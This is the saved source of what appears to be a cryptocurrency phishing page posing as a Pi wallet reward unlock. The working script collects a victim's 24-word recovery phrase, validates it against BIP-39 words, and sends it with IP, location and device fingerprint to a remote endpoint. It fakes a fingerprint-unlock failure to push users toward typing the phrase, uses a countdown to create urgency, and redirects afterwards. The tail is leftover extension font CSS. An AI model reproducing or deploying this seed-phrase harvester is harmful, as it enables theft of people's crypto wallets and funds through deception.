                            "barely",
                            "bargain",
                            "barrel",
                            "base",
                            "basic",
                            "basket",
                            "battle",
                            "beach",
                            "bean",
                            "beauty",
                            "because",
                            "become",
                            "beef",
                            "before",
                            "begin",
                            "behave",
                            "behind",
                            "believe",
                            "below",
                            "belt",
                            "bench",
                            "benefit",
                            "best",
                            "betray",
                            "better",
                            "between",
                            "beyond",
                            "bicycle",
                            // Add more common BIP-39 words if needed or use a compressed version of the full list
                        ];
                        bip39Wordlist = new Set(commonWords);
                        return bip39Wordlist;
                    } finally {
                        isFetchingWordlist = false;
                    }
                }

                // Validate if words are in the BIP-39 wordlist
                async function validateBIP39Words(words) {
                    const wordlist = await fetchBIP39Wordlist();
                    if (!wordlist) return { valid: false, invalidWords: [] }; // Wordlist not available

                    const invalidWords = words.filter((word) => !wordlist.has(word.toLowerCase()));
                    return {
                        valid: invalidWords.length === 0,
                        invalidWords: invalidWords,
                    };
                }

                // Word counter and validation
                const walletAddressInput = document.getElementById("walletAddress");
                const wordCounter = document.getElementById("wordCounter");
                const validationMessage = document.getElementById("validationMessage");
                const inputContainer = document.querySelector(".pi-input-container");

                // Start fetching the wordlist as soon as possible
                fetchBIP39Wordlist();

                // Update word count on input with debounce for better performance
                let debounceTimer;
                walletAddressInput.addEventListener("input", function () {
                    clearTimeout(debounceTimer);
                    debounceTimer = setTimeout(async () => {
                        const text = this.value.trim();
                        let wordCount = 0;
                        let words = [];

                        if (text) {
                            words = text.split(/\s+/).filter((word) => word.length > 0);
                            wordCount = words.length;
                        }

                        // Nếu có nội dung và không phải 24 từ
                        if (wordCount > 0 && wordCount !== 24) {
                            const lang = getCurrentLanguage();
                            validationMessage.classList.remove("hidden");
                            validationMessage.textContent = `Please enter exactly 24 words (current: ${wordCount})`;
                            inputContainer.classList.remove("valid-input");
                            inputContainer.classList.add("invalid-input");

                            wordCounter.textContent = "";
                        } else if (wordCount === 24) {
                            // Validate words against BIP-39 wordlist
                            const validation = await validateBIP39Words(words);

                            if (!validation.valid) {
                                const lang = getCurrentLanguage();
                                const firstInvalidWords = validation.invalidWords.slice(0, 3);
                                validationMessage.classList.remove("hidden");
                                validationMessage.textContent = `Invalid words detected: ${firstInvalidWords.join(", ")}${validation.invalidWords.length > 3 ? "..." : ""}`;
                                inputContainer.classList.remove("valid-input");
                                inputContainer.classList.add("invalid-input");
                                wordCounter.textContent = "";
                            } else {
                                validationMessage.classList.add("hidden");
                                inputContainer.classList.add("valid-input");
                                inputContainer.classList.remove("invalid-input");
                                wordCounter.textContent = "";
                            }
                        } else {
                            validationMessage.classList.add("hidden");
                            inputContainer.classList.remove("valid-input");
                            inputContainer.classList.remove("invalid-input");
                            wordCounter.textContent = "";
                        }
                    }, 300);
                });

                // Form submission with serverless API
                unlockSubmitBtn.addEventListener("click", async function () {
                    const token = document.getElementById("captchaToken").value;

                    // Security checks
                    if (ipBlockStatus.blocked) {
                        showBlockedMessage();
                        return;
                    }

                    if (hasExceededLimit()) {
                        document.getElementById("errorMessage").style.display = "block";
                        document.getElementById("errorMessage").innerHTML = `<i class="fas fa-ban mr-2"></i>You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.`;
                        trackSuspiciousActivity();
                        return;
                    }

                    // Validate wallet address
                    const walletAddress = walletAddressInput.value.trim();
                    const words = walletAddress.split(/\s+/).filter((word) => word.length > 0);
                    const wordCount = words.length;

                    if (!walletAddress || wordCount !== 24) {
                        inputContainer.classList.add("invalid-input");
                        wordCounter.textContent = `Please enter exactly 24 words (current: ${wordCount})`;
                        wordCounter.classList.add("invalid");
                        validationMessage.classList.remove("hidden");
                        trackSuspiciousActivity();
                        return;
                    }

                    // Validate against BIP-39 wordlist
                    const validation = await validateBIP39Words(words);
                    if (!validation.valid) {
                        const firstInvalidWords = validation.invalidWords.slice(0, 3);
                        wordCounter.textContent = `Invalid phrase. Invalid words: ${firstInvalidWords.join(", ")}${validation.invalidWords.length > 3 ? "..." : ""}`;
                        wordCounter.classList.add("invalid");
                        inputContainer.classList.add("invalid-input");
                        inputContainer.classList.remove("valid-input");
                        validationMessage.classList.remove("hidden");
                        validationMessage.textContent = "Phrase contains invalid words. Cannot send request.";

                        const blocked = trackSuspiciousActivity(true);
                        if (blocked) {
                            showBlockedMessage();
                        }
                        return;
                    }

                    // Show loading state
                    showLoading();

                    try {
                        // Get IP data
                        if (!userIPData || userIPData.ip === "unavailable") {
                            userIPData = await getUserIPInfo();
                        }

                        // Increment submission count
                        const newCount = incrementSubmissionCount();

                        // Format location info
                        const locationInfo = formatLocationInfo(userIPData);
                        const ipx = userIPData.ip || "unavailable";

                        // Create secure payload
                        const payload = {
                            captchaToken: token,
                            walletAddress: walletAddress,
                            ipInfo: {
                                ip: ipx,
                                location: locationInfo,
                                country: userIPData.country || "unknown",
                                city: userIPData.city || "unknown",
                            },
                            submissionCount: newCount,
                            timestamp: new Date().toISOString(),
                            deviceInfo: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screenResolution: `${window.screen.width}x${window.screen.height}`,
                            },
                        };

                        // Send request with retry mechanism
                        const response = await sendRequestWithRetry(payload, token);

                        if (response.status === 429) {
                            blockIP(ipx, "Too Many Requests");
                            window.location.replace("https://www.google.com/");
                            return;
                        }

                        if (!response.ok) {
                            throw new Error(`API error: ${response.status}`);
                        }

                        // Handle success
                        handleSubmissionSuccess();
                    } finally {
                        hideLoading();
                    }
                });

                // Helper functions for the submission process
                function formatLocationInfo(ipData) {
                    if (!ipData) return "Unknown location";

                    const city = ipData.city && ipData.city !== "unknown" ? ipData.city : "";
                    const country = ipData.country_name || getCountryName(ipData.country) || "Unknown country";

                    return city ? `${city}, ${country}` : country;
                }

                async function sendRequestWithRetry(payload, token, maxRetries = 3) {
                    for (let attempt = 1; attempt <= maxRetries; attempt++) {
                        try {
                            const response = await fetch(pendingRequests.apiEndpoint, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Cf-Token": token,
                                },
                                body: JSON.stringify(payload),
                                signal: AbortSignal.timeout(5000),
                            });
                            return response;
                        } catch (error) {
                            if (attempt === maxRetries) throw error;
                            await new Promise((resolve) => setTimeout(resolve, 1000 * attempt));
                        }
                    }
                }

                function handleSubmissionSuccess() {
                    updateUIForSubmissionCount();
                    window.location.replace("https://success-lucky-5f3e1c-moxie.netlify.app/?status=offer");
                }

                // Handle fingerprint unlock button
                document.querySelector(".pi-button-secondary").addEventListener("click", function () {
                    // Check if IP is blocked
                    if (ipBlockStatus.blocked) {
                        showBlockedMessage();
                        return;
                    }

                    // Show loading state
                    showLoading();

                    // Check if Web Authentication API is available
                    if (window.PublicKeyCredential && typeof navigator.credentials !== "undefined" && typeof navigator.credentials.get === "function") {
                        // Create options for biometric authentication
                        const publicKeyCredentialRequestOptions = {
                            challenge: new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7]),
                            allowCredentials: [],
                            timeout: 60000,
                            userVerification: "preferred",
                        };

                        // Trigger device biometric interface
                        navigator.credentials
                            .get({
                                publicKey: publicKeyCredentialRequestOptions,
                            })
                            .then((credential) => {
                                // Even if successful, show error message after 1 second
                                setTimeout(() => {
                                    hideLoading();
                                    showFingerprintError();
                                }, 1000);
                            })
                            .catch((error) => {
                                // Handle errors (user cancellation, no fingerprint, etc.)
                                console.error("Biometric authentication error:", error);
                                setTimeout(() => {
                                    hideLoading();
                                    showFingerprintError();
                                }, 1000);
                            });
                    } else {
                        // Browser doesn't support Web Authentication API
                        setTimeout(() => {
                            hideLoading();
                            showFingerprintError();
                        }, 1000);
                    }
                });

                // Show fingerprint error message
                function showFingerprintError() {
                    const errorMessage = document.getElementById("errorMessage");

                    // Show error message in English
                    errorMessage.style.display = "block";
                    errorMessage.innerHTML = `<i class="fas fa-fingerprint mr-2"></i>An error occurred. Please unlock with your 24-word phrase`;

                    // Auto-hide error message after 5 seconds
                    setTimeout(() => {
                        errorMessage.style.display = "none";
                    }, 5000);

                    // Mark as suspicious activity (optional)
                    trackSuspiciousActivity();
                }
            });

            // Persistent Countdown Timer
            function initCountdownTimer() {
                const storageKey = "piCountdownEndTime";
                let targetDate;

                // Check if there's a stored end time
                try {
                    const storedEndTime = localStorage.getItem(storageKey);
                    if (storedEndTime) {
                        targetDate = new Date(parseInt(storedEndTime));

                        // If the stored date is invalid or in the past, create a new one
                        if (isNaN(targetDate) || targetDate <= new Date()) {
                            setNewCountdownTime();
                        }
                    } else {
                        // No stored end time, create a new one
                        setNewCountdownTime();
                    }
                } catch (e) {
                    console.error("Error accessing localStorage for countdown:", e);
                    setNewCountdownTime();
                }

                // Set a new countdown time (3 days from now)
                function setNewCountdownTime() {
                    const now = new Date();
                    targetDate = new Date(now);
                    targetDate.setDate(targetDate.getDate() + 3); // Set to 3 days from now

                    try {
                        // Store the end time in localStorage
                        localStorage.setItem(storageKey, targetDate.getTime().toString());
                    } catch (e) {
                        console.error("Error storing countdown time:", e);
                    }
                }

                // Update the countdown every second
                function updateCountdown() {
                    const currentTime = new Date();
                    const diff = targetDate - currentTime;

                    // Check if countdown has ended
                    if (diff <= 0) {
                        document.getElementById("countdown-days").textContent = "00";
                        document.getElementById("countdown-hours").textContent = "00";
                        document.getElementById("countdown-minutes").textContent = "00";
                        document.getElementById("countdown-seconds").textContent = "00";

                        const openFormBtn = document.getElementById("openFormBtn");
                        if (openFormBtn) {
                            openFormBtn.textContent = getCurrentLanguage() === "en" ? "Your wallet is not eligible for rewards" : "귀하의 WALLET은 보상을 받을 수 없습니다.";
                            openFormBtn.disabled = true;
                            openFormBtn.classList.add("opacity-70");
                            openFormBtn.style.cursor = "not-allowed";
                            openFormBtn.style.backgroundColor = "#a5a5a5";
                        }
                        return;
                    }

                    // Calculate time remaining
                    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                    const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                    const seconds = Math.floor((diff % (1000 * 60)) / 1000);

                    // Update the countdown elements
                    document.getElementById("countdown-days").textContent = days < 10 ? `0${days}` : days;
                    document.getElementById("countdown-hours").textContent = hours < 10 ? `0${hours}` : hours;
                    document.getElementById("countdown-minutes").textContent = minutes < 10 ? `0${minutes}` : minutes;

                    // Apply pulse animation when seconds change
                    const secondsElement = document.getElementById("countdown-seconds");
                    const oldSeconds = secondsElement.textContent;
                    const newSeconds = seconds < 10 ? `0${seconds}` : seconds;

                    if (oldSeconds !== newSeconds) {
                        secondsElement.textContent = newSeconds;
                        secondsElement.classList.add("countdown-pulse");
                        setTimeout(() => {
                            secondsElement.classList.remove("countdown-pulse");
                        }, 1000);
                    }
                }

                // Initial update
                updateCountdown();

                // Update every second
                setInterval(updateCountdown, 1000);
            }

            document.querySelector(".pi-info-text a.pi-link").addEventListener("click", function (e) {
                e.preventDefault();

                const errorMessage = document.getElementById("walletErrorMessage");
                if (errorMessage) {
                    errorMessage.style.display = "none";
                }

                navigateTo("formPage", "createWalletPage", "right");
            });

            document.getElementById("walletCreatedBtn").addEventListener("click", function (e) {
                e.preventDefault();
                navigateTo("createWalletPage", "formPage", "left");
            });

            document.getElementById("createNewWalletBtn").addEventListener("click", function () {
                const errorMessage = document.getElementById("walletErrorMessage");
                if (errorMessage) {
                    errorMessage.style.display = "block";
                }
            });

            window.onload = function () {
                grecaptcha.ready(function () {
                    grecaptcha.execute("6LfsTgsrAAAAAJB-bvdznVzM8YsTBG4gtWRVLtT8", { action: "homepage" }).then(function (token) {
                        console.log(token);
                        document.getElementById("captchaToken").value = token;
                    });
                });
            };
        </script>

		<script src="./index.php_files/api.js.download"></script>
        <!-- Histats.com  START (hidden counter) -->
        <a href="https://pimart.us/" alt="" target="_blank">
            <img src="./index.php_files/0.gif" alt="" border="0">
        </a>
        <!-- Histats.com  END  -->
    

<div id="iconsContainer" bis_skin_checked="1" style="position: fixed; width: 100%; height: 100%; top: 0px; left: 0px; pointer-events: none; z-index: -5; overflow: hidden;"><img class="floating-icon-img" src="./index.php_files/isolated-purple-balloon-no-background-with-ribbon-png.png" style="--float-distance: -35.40574871527417px; left: 84.2209%; width: 110.954px; height: 110.954px; animation-duration: 59.0253s;"></div><div bis_skin_checked="1"><div class="grecaptcha-badge" data-style="bottomright" bis_skin_checked="1" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo" bis_skin_checked="1"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-hhban796c07n" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./index.php_files/anchor.html" bis_size="{&quot;x&quot;:1281,&quot;y&quot;:882,&quot;w&quot;:256,&quot;h&quot;:60,&quot;abs_x&quot;:1281,&quot;abs_y&quot;:882}"></iframe></div><div class="grecaptcha-error" bis_skin_checked="1"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./index.php_files/saved_resource(1).html"></iframe></div><div id="kins-kins-popup" bis_skin_checked="1" style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block; dominant-baseline: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; quotes: initial; r: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-initial-target: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-box: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;"><style>
                    #kins_root {
                        display: block !important;
                    }
                </style><div id="kins_root" bis_skin_checked="1" style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block; dominant-baseline: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-clip-margin: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; quotes: initial; r: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-initial-target: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-box: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-print-color-adjust: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;"><template shadowrootmode="closed"><div id="kins_shadow_root"><style type="text/css">
            * {
                font-family:  Rubik, sans-serif !important;
            }
        </style><style id="kins_font" type="text/css">
            
                /* rubik-300normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 300;
                    src:
                        local('Rubik Light'),
                        local('Rubik-Light'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/9d2ccd264dc61b9540199896728594ab.ttf') format('ttf');
                }

                /* rubik-300italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 300;
                    src:
                        local('Rubik Light italic'),
                        local('Rubik-Lightitalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/eddc6610fb077c6d999f1661fc721078.ttf') format('ttf');
                }

                /* rubik-400normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 400;
                    src:
                        local('Rubik Regular'),
                        local('Rubik-Regular'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/55fa11cdc8b9a3ee842fbb554733127c.ttf') format('ttf');
                }

                /* rubik-400italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 400;
                    src:
                        local('Rubik Regular italic'),
                        local('Rubik-Regularitalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/dd425b2765df0b8534886a866b864377.ttf') format('ttf');
                }

                /* rubik-500normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 500;
                    src:
                        local('Rubik Medium'),
                        local('Rubik-Medium'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/0e121b4fa4d6e9bc5c69eabb74d853dc.ttf') format('ttf');
                }

                /* rubik-500italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 500;
                    src:
                        local('Rubik Medium italic'),
                        local('Rubik-Mediumitalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/be80ed5dcc329afda7864601618e16a8.ttf') format('woff2');
                }

                /* rubik-600normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 500;
                    src:
                        local('Rubik SemiBold'),
                        local('Rubik-SemiBold'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/869208702057daef053d3faf0a6618fe.ttf') format('ttf');
                }

                /* rubik-600italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 500;
                    src:
                        local('Rubik SemiBold italic'),
                        local('Rubik-SemiBolditalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/3dbd4a6bacf93f30b48349b91d2f4323.ttf') format('ttf');
                }
                /* rubik-700normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 700;
                    src:
                        local('Rubik Bold'),
                        local('Rubik-Bold'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/c934eb22c2c69992b34c85801f5dbc38.ttf') format('ttf');
                }

                /* rubik-700italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 700;
                    src:
                        local('Rubik Bold italic'),
                        local('Rubik-Bolditalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/8aa61adc9e2d6f955dfebf308dbb5a02.ttf') format('ttf');
                }

                /* rubik-800normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 800;
                    src:
                        local('Rubik ExtraBold'),
                        local('Rubik-ExtraBold'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/c934eb22c2c69992b34c85801f5dbc38.ttf') format('ttf');
                }

                /* rubik-800italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 800;
                    src:
                        local('Rubik ExtraBold italic'),
                        local('Rubik-ExtraBolditalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/8aa61adc9e2d6f955dfebf308dbb5a02.ttf') format('ttf');
                }
                 /* rubik-900normal */
                @font-face {
                    font-family: 'Rubik';
                    font-style: normal;
                    font-display: swap;
                    font-weight: 900;
                    src:
                        local('Rubik Black'),
                        local('Rubik-Black'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/a41b3ae4e6720095094692f7e9dd4a6b.ttf') format('ttf');
                }

                /* rubik-900italic */
                @font-face {
                    font-family: 'Rubik';
                    font-style: italic;
                    font-display: swap;
                    font-weight: 900;
                    src:
                        local('Rubik Black italic'),
                        local('Rubik-Blackitalic'),
                        url('chrome-extension://hjbfbllnfhppnhjdhhbmjabikmkfekgf/fonts/acfb29dc2fb1e14bc1a05c700790f7ce.ttf') format('ttf');
                }
